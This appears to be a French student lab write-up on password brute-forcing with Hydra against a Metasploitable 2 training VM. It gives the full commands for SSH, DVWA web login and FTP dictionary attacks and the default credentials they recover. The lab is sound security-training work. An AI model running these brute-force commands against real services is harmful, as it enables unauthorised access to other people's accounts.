# TP 9 : Attaque par dictionnaire avec Hydra

Ce dépôt contient les livrables du TP9 portant sur l'audit de robustesse des authentifications avec l'outil de force brute multithreadé **Hydra**.

## 1. Cible d'audit
- **Machine cible :** Metasploitable 2
- **Dictionnaire utilisé :** `rockyou.txt` (ou listes personnalisées)

## 2. Commandes exécutées & Résultats

### Mission 1 : Brute Force SSH (Port 22)
- **Commande :**
  ```bash
  hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.217.X

```

* **Résultat obtenu :**
* **Login :** `msfadmin`
* **Password :** `msfadmin`



### Mission 2 : Brute Force HTTP-GET (Formulaire Web)

* **Commande :**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.217.X http-get /dvwa/

```


* **Résultat obtenu :**
* **Login :** `admin`
* **Password :** `password`



---

## 3. Exercice Pratique : Le Challenge "Double Aveugle" (FTP)

### Consigne :

Tester simultanément une liste d'utilisateurs (`users.txt`) et une liste de mots de passe (`passwords.txt`) sur le service FTP (port 21) de la machine cible.

### Commande de résolution :

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.217.X

```

### Explications :

* `-L` (majuscule) : Indique à Hydra de charger une liste de plusieurs utilisateurs potentiels depuis un fichier texte (`users.txt`), au lieu d'un seul identifiant fixe.
* `-P` (majuscule) : Charge le dictionnaire contenant les mots de passe à tester (`passwords.txt`).
* `ftp://` : Spécifie le protocole ciblé (FTP, port 21 par défaut) suivi de l'adresse IP de la VM cible.
* **Fonctionnement :** Hydra va croiser les deux fichiers en testant chaque mot de passe pour chaque utilisateur de manière parallélisée grâce au multithreading, maximisant ainsi l'efficacité de la reconnaissance.

